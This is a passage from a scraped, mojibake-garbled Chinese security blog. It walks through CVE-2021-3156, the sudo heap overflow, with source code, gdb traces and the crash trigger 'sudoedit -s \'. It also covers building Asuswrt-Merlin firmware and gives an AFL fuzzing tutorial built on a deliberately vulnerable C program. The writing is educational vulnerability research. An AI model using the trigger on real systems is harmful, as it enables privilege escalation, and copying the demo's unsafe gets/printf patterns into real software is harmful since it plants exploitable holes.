ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦å‰åŠ ä¸Šå­—ç¬¦ \\ï¼Œç”¨äºè½¬ä¹‰ if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;) *dst++ = \u0026#39;\\\\\u0026#39;; // Cæºä»£ç ä¸­ç”¨ \u0026#39;\\\\\u0026#39; è¡¨ç¤ºå­—ç¬¦ \\ *dst++ = *src; } *dst++ = \u0026#39; \u0026#39;; } if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = \u0026#39;\\0\u0026#39;; ac += 2; /* -c cmnd */ } av = reallocarray(NULL, ac + 1, sizeof(char *)); if (av == NULL) sudo_fatalx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); if (!gc_add(GC_PTR, av)) exit(EXIT_FAILURE); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) { av[1] = \u0026#34;-c\u0026#34;; av[2] = cmnd; } av[ac] = NULL; argv = av; argc = ac; } parse_argså‡½æ•°æ˜¯æ•…äº‹çš„å¼€å§‹ã€‚è™½ç„¶åšå¥½äº†å‡ºå‘æ¼æ´çš„å‡†å¤‡ï¼Œä½†åˆ°ç›®å‰ä¸ºæ­¢å°šä¸”æ— äº‹å‘ç”Ÿã€‚æˆ‘ä»¬éœ€è¦æ¥ç€å‘ä¸‹æ¢ç´¢ã€‚æ•…å¼€å¯è°ƒè¯•ä»¥åŠ¨æ€è·Ÿè¸ªï¼Œä¸‹æ–­ç‚¹äºä¸Šè¿° if å—çš„èµ·å§‹ä½ç½®ï¼š\n1 2 3 4 5 gdb src/.libs/sudoedit pwndbg\u0026gt; set args -s / pwndbg\u0026gt; set environment LD_LIBRARY_PATH=./lib/util/.libs/ pwndbg\u0026gt; b parse_args.c:604 pwndbg\u0026gt; r ä¸€è·¯å‘ä¸‹è·Ÿè¸ªï¼Œå°½å¿«æ¥åˆ°æœ¬æ¬¡äº‹ä»¶çš„æ¼æ´ä¸­å¿ƒâ€”â€” set_cmnd å‡½æ•°çœ‹çœ‹ã€‚backtraceå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 pwndbg\u0026gt; bt #0 set_cmnd () at ./sudoers.c:922 #1 sudoers_policy_main (argc=argc@entry=3, argv=argv@entry=0x555555584590, pwflag=pwflag@entry=0, env_add=env_add@entry=0x0, verbose=verbose@entry=false, closure=closure@entry=0x7fffffffe1d0) at ./sudoers.c:401 #2 0x00007ffff79de5f2 in sudoers_policy_check (argc=3, argv=0x555555584590, env_add=0x0, command_infop=0x7fffffffe290, argv_out=0x7fffffffe298, user_env_out=0x7fffffffe2a0, errstr=0x7fffffffe2b8) at ./policy.c:1028 #3 0x000055555555aefa in policy_check (user_env_out=0x7fffffffe2a0, argv_out=0x7fffffffe298, command_info=0x7fffffffe290, env_add=0x0, argv=0x555555584590, argc=3) at ./sudo.c:1171 #4 main (argc=argc@entry=3, argv=argv@entry=0x7fffffffe538, envp=\u0026lt;optimized out\u0026gt;) at ./sudo.c:269 #5 0x00007ffff7da4083 in __libc_start_main (main=0x55555555aa00 \u0026lt;main\u0026gt;, argc=3, argv=0x7fffffffe538, init=\u0026lt;optimized out\u0026gt;, fini=\u0026lt;optimized out\u0026gt;, rtld_fini=\u0026lt;optimized out\u0026gt;, stack_end=0x7fffffffe528) at ../csu/libc-start.c:308 #6 0x000055555555d06e in _start () set_cmnd å°±æ˜¯æ¼æ´è§¦å‘ç‚¹æ‰€åœ¨çš„å‡½æ•°äº†ï¼Œå…¶ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 /* * Fill in user_cmnd, user_args, user_base and user_stat variables * and apply any command-specific defaults entries. */ static int set_cmnd(void) { //... // å–æ¶ˆè½¬ä¹‰ç¬¦éœ€æ»¡è¶³çš„æ¡ä»¶1 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { //... /* set user_args */ if (NewArgc \u0026gt; 1) { char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) { sudo_warnx(U_(\u0026#34;%s: %s\u0026#34;), __func__, U_(\u0026#34;unable to allocate memory\u0026#34;)); debug_return_int(NOT_FOUND_ERROR); } // å–æ¶ˆè½¬ä¹‰ç¬¦éœ€æ»¡è¶³çš„æ¡ä»¶2 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ // éå†ä¼ å…¥çš„å‚æ•° for (to = user_args, av = NewArgv + 1; (from = *av); av++) { while (*from) { // å½“å½“å‰å­—ç¬¦ä¸º \\ï¼Œä¸”å…¶åç´§è·Ÿçš„å­—ç¬¦ä¸ä¸ºç©ºæ ¼æ—¶ï¼Œåˆ™è·³è¿‡å¯¹å½“å‰å­—ç¬¦ \\ çš„å¤åˆ¶ // å³ï¼šå°†ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰è½¬ä¹‰ç¬¦èˆå» if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; } *to++ = \u0026#39; \u0026#39;; } *--to = \u0026#39;\\0\u0026#39;; } else { //... } } } //... } å›åˆ°æ–‡ç« å¼€å¤´çš„ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æå…¶ä¸­çš„é”™è¯¯åŸå› äº†ï¼š\n1 2 3 âœ sudo git:(master) âœ— LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1357050 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; å¯¹äºè¿™æ®µä»£ç ï¼š\n1 2 3 4 5 6 7 while (*from) { // å½“å½“å‰å­—ç¬¦ä¸º \\ï¼Œä¸”å…¶åç´§è·Ÿçš„å­—ç¬¦ä¸ä¸ºç©ºæ ¼æ—¶ï¼Œåˆ™è·³è¿‡å¯¹å½“å‰å­—ç¬¦ \\ çš„å¤åˆ¶ // å³ï¼šå°†ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰è½¬ä¹‰ç¬¦èˆå» if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; } è‹¥ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­—ç¬¦ä¸²ä»¥ \\ ç»“å°¾ï¼Œåˆ™ä¼šä½¿å¾—å¤„ç†è¯¥ \\ å­—ç¬¦æ—¶å‡ºç°ï¼š\nfrom[0] == '\\\\'ï¼ˆå•èµ°ä¸€ä¸ª \\ ) from[1] == '\\x00' ï¼ˆCè¯­è¨€å­—ç¬¦ä¸²ç»“å°¾æ ‡è®°å­—ç¬¦ï¼‰ å¯¼è‡´æ­¤æ¬¡å¾ªç¯ä¸­ifæ¡ä»¶æˆç«‹ï¼Œæ‰§è¡Œ from++ï¼Œå†åŠ ä¸Šä¸‹ä¸€è¡Œçš„ *to++ = *from++ï¼Œä½¿å¾—fromæŒ‡é’ˆç›´æ¥è¶Šè¿‡äº†åŸå­—ç¬¦ä¸²çš„èŒƒå›´ã€‚ç”±æ­¤å¯¼è‡´*from == \\x00æ—¶çš„ä¸€å­—èŠ‚è¢«ç•¥è¿‡ï¼Œwhileç»§ç»­æ‰§è¡Œï¼Œæ‹·è´äº†é¢å¤–çš„éæ³•æ•°æ®ã€‚\nç”±æ­¤å¾—åˆ°äº†ç¨‹åºä¸­çš„é”™è¯¯ï¼Œä½†è¿™ä¸ªé”™è¯¯æ˜¯å¦‚ä½•æˆä¸ºæ¼æ´çš„ï¼Œè¿˜éœ€å‘ä¸Šå›æº¯è¢«å†™å…¥çš„ç¼“å†²åŒºï¼š\nå‘toæŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å†™å…¥æ¥è‡ªfromæŒ‡é’ˆçš„æ•°æ®ï¼š 1 *to++ = *from++; toæŒ‡é’ˆç”¨äºå‘user_argsç¼“å†²åŒºå†™å…¥æ•°æ®ï¼š 1 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { user_argsç¼“å†²åŒºæ˜¯mallocäº†sizeå¤§å°å¾—åˆ°çš„å †ç¼“å†²åŒºï¼š 1 if (size == 0 || (user_args = malloc(size)) == NULL) { å †ç¼“å†²åŒºå¤§å°sizeç”±è®¡ç®—å­˜å‚¨å‘½ä»¤å‚æ•°å­—ç¬¦ä¸²æ‰€éœ€çš„æ€»å­—èŠ‚æ•°å¾—åˆ°ï¼š 1 2 3 /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; é‚£ä¹ˆå‘user_argså †å—ä¸­å†™å…¥è¿‡é‡çš„æ•°æ®ï¼Œåˆ™é€ æˆå †æº¢å‡ºã€‚\nä¸”æ…¢ï¼å•çœ‹è¿™é‡Œçš„ä»£ç çš„ç¡®æœ‰é—®é¢˜ï¼Œä½†æˆ‘ä»¬å‡è®¾çš„ä»¥å•ä¸€ä¸€ä¸ª \\ ç»“å°¾çš„å­—ç¬¦ä¸²çœŸçš„èƒ½ä¼ é€’åˆ°è¿™é‡Œæ¥å—ï¼Ÿ\næ¯•ç«Ÿå¦‚æœæ˜¯ä¸¤ä¸ª \\ ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œåˆ™*from == \\x00æ—¶åˆ™æ­£ç¡®å‘½ä¸­whileåˆ¤æ–­ï¼Œç¨‹åºä¸ä¼šå‡ºé”™ã€‚\nè€Œå‰é¢parse_argså‡½æ•°åšçš„å¤„ç†ï¼Œæ­£æ˜¯ä¼šå°† \\ å‰é¢å†æ·»åŠ ä¸Šä¸€ä¸ªè½¬ä¹‰ç¬¦ \\ çš„å‘€ã€‚\né‚£è¿™é‡Œä¸ºå•¥ä¼šæˆåŠŸè§¦å‘é”™è¯¯ï¼Ÿå…ˆæ­æ™“ä¸‹ç­”æ¡ˆï¼Œå†é’ˆå¯¹å…¶è¿›è¡Œåˆ†æï¼š\n1 2 3 4 5 âœ sudo git:(master) âœ— LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; malloc(): corrupted top size [1] 1383588 abort (core dumped) LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudoedit -s \u0026#39;\\\u0026#39; âœ sudo git:(master) âœ— LD_LIBRARY_PATH=./lib/util/.libs/ src/.libs/sudo -s \u0026#39;\\\u0026#39; zsh:1: command not found: \\ æ–‡ç« å‰åŠéƒ¨åˆ†ä¸ºsudoå»ºç«‹äº†ä¸€ä¸ªç¬¦å·é“¾æ¥sudoeditï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶ä½¿ç”¨sudoeditæ‰§è¡Œå°±èƒ½æˆåŠŸè§¦å‘æ¼æ´ï¼Œä½†ä½¿ç”¨åŸæœ¬çš„sudoåˆ™ä¸å¯ä»¥ã€‚æ‰€ä»¥ä»£ç ä¸­è‚¯å®šæœ‰é€»è¾‘å¯¹äºå¯åŠ¨æ—¶ä¸åŒçš„ç¨‹åºåç§°åšå‡ºäº†åˆ¤æ–­ï¼Œè¿›è€Œæ‰§è¡Œäº†ä¸åŒé€»è¾‘ã€‚\nå›åˆ°æºä»£ç ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°parse_argså‡½æ•°æ·»åŠ è½¬ä¹‰ç¬¦çš„è§¦å‘æ¡ä»¶å’Œset_cmndå‡½æ•°å–æ¶ˆè½¬ä¹‰ç¬¦çš„è§¦å‘æ¡ä»¶æ˜¯ä¸åŒçš„ï¼š\nparse_args 1 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { set_cmnd 1 2 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { å³ï¼š\næ·»åŠ è½¬ä¹‰ç¬¦æ“ä½œéœ€æ»¡è¶³modeè®¾ç½®äº†MODE_RUNï¼Œä¸”flagsè®¾ç½®äº†MODE_SHELL å–æ¶ˆè½¬ä¹‰ç¬¦æ“ä½œéœ€sudo_modeè®¾ç½®äº†(MODE_RUN|MODE_EDIT|MODE_CHECK) \u0026amp;\u0026amp; (MODE_SHELL|MODE_LOGIN_SHELL) é‚£ä¹ˆæƒ³è¦è¾¾æˆä¸æ‰§è¡Œæ·»åŠ è½¬ä¹‰ç¬¦çš„æ“ä½œï¼Œä¸”æ‰§è¡Œå–æ¶ˆè½¬ä¹‰ç¬¦çš„æ“ä½œçš„ç›®çš„ï¼Œå°±éœ€è¦æ»¡è¶³ï¼š\n1 MODE_SHELL \u0026amp;\u0026amp; !MODE_RUN \u0026amp;\u0026amp; (MODE_EDIT || MODE_CHECK) çœ‹æ¥éœ€è¦å¯»æ‰¾MODE_EDITä¸MODE_CHECKä»ä½•è€Œæ¥äº†ã€‚\nä»parse_argsä¸­å¯çŸ¥ï¼Œå®ƒä»¬æ¥è‡ªäº-eå’Œ-lå‚æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { // ... for (;;) { if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) { switch (ch) { // ... case \u0026#39;e\u0026#39;: if (mode \u0026amp;\u0026amp; mode != MODE_EDIT) usage_excl(); // è®¾ç½® mode ä¸º MODE_EDIT mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; valid_flags = MODE_NONINTERACTIVE; break; // ... case \u0026#39;l\u0026#39;: if (mode) { if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(); } // è®¾ç½® mode ä¸º MODE_LIST mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE | MODE_LONG_LIST; break; // ... } } // ... } // ... // åœ¨æ­¤å¤„å°† MODE_LIST æ›´æ–°ä¸º MODE_CHECK if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST) mode = MODE_CHECK; // ... // å¿…é¡»ç»•è¿‡çš„ç‰¹æ®Šåˆ¤æ–­æ¡ä»¶ if ((flags \u0026amp; valid_flags) != flags) usage(); // ... } å®ƒä»¬çš„ä½œç”¨ï¼š\n1 2 -e, --edit edit files instead of running a command -l, --list list user\u0026#39;s privileges or check a specific command; use twice for longer format ç”±æ­¤çœ‹æ¥ï¼Œå‘ç°ä¸å¦™ï¼š\nä»åŠŸèƒ½æè¿°ä¸Šï¼Œ-eã€-lå‚æ•°çš„åŠŸèƒ½å’Œ-sã€-iå‚æ•°çš„åŠŸèƒ½æ˜¯å†²çªçš„ï¼Œä¼°è®¡æ²¡æ³•ä¸€èµ·ç”¨ ä»æºä»£ç ä¸Šçœ‹æ¥ï¼Œçš„ç¡®å¦‚æ­¤ã€‚é€šè¿‡-eã€-lå‚æ•°è®¾å®švalid_flagså˜é‡ï¼Œå¹¶è¿›è¡Œå¦‚ä¸‹åˆ¤æ–­çš„æ‰‹æ³•ï¼Œsudoè§„é¿äº†ä¸Šè¿°ç”¨æ³•ï¼Œå¹¶å‘ç”¨æˆ·æ‰“å°äº†usageæ•™ä½ æ€ä¹ˆç”¨å®ƒï¼š 1 2 if ((flags \u0026amp; valid_flags) != flags) usage(); ç»•è¿‡çš„æ–¹æ³•å‘¢ï¼Ÿä¸Šæ–‡å·²ç»æ­æ™“è¿‡äº†ã€‚ä½¿ç”¨sudoeditä½œä¸ºç¨‹åºåè°ƒç”¨sudoï¼Œèƒ½èµ·åˆ°å’Œsudo -eä¸€æ ·çš„æ•ˆæœï¼Œå´ä¸ä¼šè¿›å…¥parse_argsä¸­çš„è¿™æ®µåˆ¤æ–­é€»è¾‘ä¸­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int parse_args(int argc, char **argv, int *old_optind, int *nargc, char ***nargv, struct sudo_settings **settingsp, char ***env_addp) { /* First, check to see if we were invoked as \u0026#34;sudoedit\u0026#34;. */ // å¦‚æœä»¥ sudoedit ä½œä¸ºç¨‹åºå proglen = strlen(progname); if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) { progname = \u0026#34;sudoedit\u0026#34;; // åˆ™è®¾ç½® mode ä¸º MODE_EDIT mode = MODE_EDIT; // æ³¨æ„ä¹‹åå°±æ²¡æœ‰å†è®¾ç½® valid_flagsäº† sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; } } ç”±æ­¤ï¼Œåˆ°è¾¾æ¼æ´ç‚¹çš„è·¯å¾„å°±é€šç•…äº†ã€‚\n","date":"2022-05-13T23:02:59+08:00","image":"https://s2.loli.net/2022/05/19/FeqdKtWJZ3GonMX.png","permalink":"https://cerr.cc/post/cve-2021-3156-sudo-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2021-3156 sudo ææƒæ¼æ´åˆ†æ"},{"content":"è·å–æ¢…æ— å®˜ç½‘å¦‚ä¸‹ï¼šasuswrt-merlin.net\næ–°æ¢…æ—ï¼šhttps://github.com/RMerl/asuswrt-merlin.ng\næ—§æ¢…æ—ï¼ˆåœæ­¢å¼€å‘ï¼‰ï¼šhttps://github.com/RMerl/asuswrt-merlin\nè¿™é‡Œé€‰ç”¨asuswrt-merlin.ngè¿›è¡Œç¼–è¯‘æ„å»º\n1 wget https://github.com/RMerl/asuswrt-merlin.ng/archive/refs/heads/master.zip ï¼ˆä¸‹è½½zipè€Œécloneä»“åº“ï¼ŒèŠ‚çœ.gitçš„å ç”¨\nç¯å¢ƒå‡†å¤‡ README.txt ç»™å‡ºäº†ç¼–è¯‘æ–¹å¼ï¼šhttps://github.com/RMerl/asuswrt-merlin.ng/blob/master/README.TXT\nåŒ…ä¾èµ–éå¸¸å¤šï¼Œæ‰€ä»¥å°½åŠ›å°†æœ¬åœ°ç¯å¢ƒè´´åˆå®ƒçš„ç¼–è¯‘è¯´æ˜ï¼Œä»¥é¿å…æœªçŸ¥é”™è¯¯ã€‚\næ‰€ä»¥é€‰å– ubuntu:16.04 ä½œä¸ºç¼–è¯‘å¹³å°ã€‚\næ•…é¦–å…ˆå®‰è£…dockerï¼Œå¿«é€Ÿå®‰è£…cheatsheetåœ¨æ­¤ï¼šhttp://zikey.vip/post/some_installation/\næ‹‰å–ubuntu 16.04é•œåƒå¹¶è®¾å®šå…±äº«æ–‡ä»¶å¤¹ï¼š\n1 sudo docker run -it -v /home/zkv/docker_share/:/share ubuntu:16.04 ä¾èµ–å®‰è£… è¿›å…¥docker ubuntuç¯å¢ƒåï¼Œä¸‹è½½å¹¶è§£å‹æ¢…æ—ngï¼š\n1 2 3 apt install wget unzip wget https://github.com/RMerl/asuswrt-merlin.ng/archive/refs/heads/master.zip unzip master.zip README.txt ä¸­æåˆ°ï¼Œéœ€å®‰è£…éƒ¨åˆ†32ä½ä¾èµ–åŒ…ï¼Œæ•…å…ˆæ·»åŠ 32ä½è½¯ä»¶æºï¼š\n1 2 dpkg --add-architecture i386 apt update æ­¤åä¾¿å¯ä»¥ç›´æ¥ä¾ç…§è¯´æ˜å®‰è£…æ‰€æœ‰ä¾èµ–åŒ…ï¼š\n1 apt install libncurses5 libncurses5-dev m4 bison gawk flex libstdc++6-4.7-dev g++-4.7 g++ gengetopt git gitk zlib1g-dev autoconf autopoint libtool-bin shtool autogen mtd-utils intltool sharutils docbook-xsl-* libstdc++5 texinfo dos2unix xsltproc u-boot-tools device-tree-compiler qemu gperf liblzo2-dev uuid-dev build-essential lzma-dev liblzma-dev lzma binutils-dev patch cmake intltool libglib2.0-dev gtk-doc-tools libc6-i386 lib32stdc++6 lib32z1 libelf1:i386 lib32ncurses5 libc6-dev-i386 æ¥ç€è·å–æ¢…æ—æä¾›çš„ç¼–è¯‘å·¥å…·é“¾ï¼š\n1 2 cd $HOME git clone https://github.com/RMerl/am-toolchains å°†å·¥å…·é“¾ç›®å½•å¯¼å‡ºè‡³ç¯å¢ƒå˜é‡ï¼Œå‚è§ https://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-Firmware-from-sourceï¼š\næˆ‘è¿™é‡Œçš„ç›®æ ‡æ˜¯ RT-AC86Uï¼Œæ•…ï¼š\n1 2 3 4 5 sudo ln -s ~/am-toolchains/brcm-arm-hnd /opt/toolchains echo \u0026#34;export LD_LIBRARY_PATH=\\$LD_LIBRARY:/opt/toolchains/crosstools-arm-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/lib\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;export TOOLCHAIN_BASE=/opt/toolchains\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;PATH=\\$PATH:/opt/toolchains/crosstools-arm-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/bin\u0026#34; \u0026gt;\u0026gt; ~/.profile echo \u0026#34;PATH=\\$PATH:/opt/toolchains/crosstools-aarch64-gcc-5.3-linux-4.1-glibc-2.22-binutils-2.25/usr/bin\u0026#34; \u0026gt;\u0026gt; ~/.profile å¼€å§‹ç¼–è¯‘ 1 2 cd ~/release/src-rt-5.02hnd make rt-ac86u Easymod å¦‚ä¸Šæ‰€è¿°æ‰‹åŠ¨æŠ˜è…¾åˆ°ä¸€åŠï¼Œå‘ç°äº†æœ‰ç®€å•æ¨¡å¼çš„è‡ªåŠ¨åŒ–æ–¹æ¡ˆã€‚READMEå†…çš„ä¿¡æ¯å®åœ¨å¤ªå°‘ï¼Œgithub wikié‡Œæœ‰å®˜æ–¹çš„ç¼–è¯‘æ„å»ºæ•™ç¨‹ï¼š\nå®˜æ–¹wikiï¼š\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/\nç»„ä»¶ç¼–è¯‘ï¼š\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-custom-programs-from-source\nå›ºä»¶ç¼–è¯‘ï¼š\nhttps://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-Firmware-from-source\nåŒæ—¶æœ‰ç°æˆçš„dockerç¯å¢ƒï¼š\nhttps://github.com/gnuton/Asuswrt-Merlin-Toolchains-Docker\nå‰é¢ï¼Œç™½å¹²ã€‚\n","date":"2022-05-11T16:27:10+08:00","image":"https://www.asuswrt-merlin.net/sites/default/files/inline-images/main_page_sm_2.png","permalink":"https://cerr.cc/post/%E5%8D%8E%E7%A1%95%E6%A2%85%E6%9E%97%E5%9B%BA%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91/","title":"åç¡•æ¢…æ—å›ºä»¶çš„ç¼–è¯‘"},{"content":"\\x00 æ—©æ•™æ•™ç¨‹ æ•™ç¨‹ è°·æ­Œçš„Fuzzingæ•™ç¨‹\nFuzzingbook\nè¯¾ç¨‹ å—äº¬å¤§å­¦ï¼šè½¯ä»¶åˆ†æ\nå—äº¬å¤§å­¦ï¼šè½¯ä»¶åˆ†æè¯¾ç¨‹è§†é¢‘\nåšæ–‡ FuzzingæŠ€æœ¯å‘å±•çš„è¿™30å¹´\nä¸€äº›å€¼å¾—å­¦ä¹ çš„Fuzzerå¼€æºé¡¹ç›®\nFuzzingæˆ˜äº‰: ä»åˆ€å‰‘å¼“æ–§åˆ°æ˜Ÿçƒå¤§æˆ˜\nFuzzingæˆ˜äº‰ç³»åˆ—ä¹‹äºŒï¼šä¸ç•æµ®äº‘é®æœ›çœ¼\nç»ƒå…µåœº Fuzzing101\nå…µå™¨ AFL\nAFLplusplus\nèµ„æº https://github.com/secfigo/Awesome-Fuzzing\nè®ºæ–‡ å¼€å±± 1988å¹´ï¼Œåœ¨å¨æ–¯åº·æ˜Ÿå¤§å­¦Barton Milleræ•™æˆçš„è®¡ç®—æœºå®éªŒè¯¾ä¸Šï¼Œé¦–æ¬¡æå‡ºFuzzç”Ÿæˆå™¨(Fuzz Generator)çš„æ¦‚å¿µï¼Œç”¨äºæµ‹è¯•Unixç¨‹åºçš„å¥å£®æ€§ï¼Œå³ç”¨éšæœºæ•°æ®æ¥æµ‹è¯•ç¨‹åºç›´è‡³å´©æºƒã€‚å› æ­¤ï¼ŒBarton Milleræ•™æˆä¹Ÿè¢«å¤šæ•°äººå°Šç§°ä¸ºâ€æ¨¡ç³Šæµ‹è¯•ä¹‹çˆ¶â€ã€‚\nhttp://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf\nä»£ç è¦†ç›–å¼•å¯¼Fuzzingä¹‹AFL \\x01 å­¦æ­¥è½¦AFLåˆæ¢ æœ€ç®€å•çš„ fuzzing demo ä½¿ç”¨AFLï¼Œæ•…å…ˆå®‰è£…ï¼š\n1 2 3 4 git clone https://github.com/google/AFL.git cd AFL make -j`nproc` sudo make install æ¥ç€å‡†å¤‡è¢«æµ‹ç¨‹åºæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;signal.h\u0026gt; int vuln(char *str) { int len = strlen(str); if(str[0] == \u0026#39;A\u0026#39; \u0026amp;\u0026amp; len == 66) raise(SIGSEGV); else if(str[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; len == 6) raise(SIGSEGV); else puts(\u0026#34;\\nnothing happened\u0026#34;); return 0; } int main(int argc, char *argv[]) { char buf[100]={0}; gets(buf); printf(buf); vuln(buf); return 0; } ä½¿ç”¨afl-gccæ’è£…ç¼–è¯‘ï¼š\n1 afl-gcc vulner.c -o vulner å‡†å¤‡fuzzingè¾“å…¥ä¸è¾“å‡ºçš„æ–‡ä»¶å¤¹ï¼š\n1 mkdir fuzz_in fuzz_out åˆ›å»ºä¸¤ä¸ªæ ·ä¾‹è¾“å…¥ï¼š\n1 2 echo -n AAAA \u0026gt; fuzz_in/input_case_1 echo -e -n \u0026#34;\\x01\\x02\\x03\\x04\u0026#34; \u0026gt; fuzz_in/input_case_2 å¯åŠ¨fuzzingï¼š\n1 afl-fuzz -i fuzz_in -o fuzz_out ./vulner Ctrl+Cåœæ­¢åï¼Œç”±fuzzing_outä¸­æ‹¿åˆ°fuzzingç»“æœã€‚ç”¨å…¶ä¸­çš„ä¸€ä¸ªcrashè¾“å…¥æµ‹è¯•ä¸‹ï¼š\n1 2 3 4 5 âœ ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 6666 nothing happened *** stack smashing detected ***: terminated [1] 1541204 abort ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 å¯ä»¥çœ‹åˆ°å‘ç”Ÿäº†æ ˆæº¢å‡ºã€‚\nä¸ºå­¦æ­¥è½¦è£…ä¸Šåä¸ºsanitizersçš„è½®å­ å€ŸåŠ©äºsanitizersè·å¾—æ›´å¤šå´©æºƒçš„è¯¦ç»†ä¿¡æ¯ï¼š\nå¼€å¯AddressSanitizeré‡æ–°ç¼–è¯‘ç¨‹åºï¼š\n1 afl-clang -fsanitize=address vulner.c -o vulner ä½¿ç”¨ä¸Šä¸€éƒ¨åˆ†ç›¸åŒçš„crashè¾“å…¥ç”¨ä¾‹ï¼Œæ¥æµ‹è¯•æ‰“å¼€äº†AddressSanitizerçš„ç¨‹åºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 âœ ./vulner \u0026lt; fuzz_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:32 ================================================================= ==1541245==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe9090e564 at pc 0x0000004393cb bp 0x7ffe9090e3a0 sp 0x7ffe9090db28 READ of size 116 at 0x7ffe9090e564 thread T0 #0 0x4393ca in printf_common(void*, char const*, __va_list_tag*) (/f/lab/fuzzing_baby/vulner+0x4393ca) #1 0x43af1e in printf (/f/lab/fuzzing_baby/vulner+0x43af1e) #2 0x4c3418 in main /root/lab/fuzzing_baby/vulner.c:17:5 #3 0x7f09a7252082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #4 0x41b33d in _start (/f/lab/fuzzing_baby/vulner+0x41b33d) Address 0x7ffe9090e564 is located in stack of thread T0 at offset 132 in frame #0 0x4c32cf in main /root/lab/fuzzing_baby/vulner.c:14 This frame has 1 object(s): [32, 132) \u0026#39;buf\u0026#39; (line 15) \u0026lt;== Memory access at offset 132 overflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow 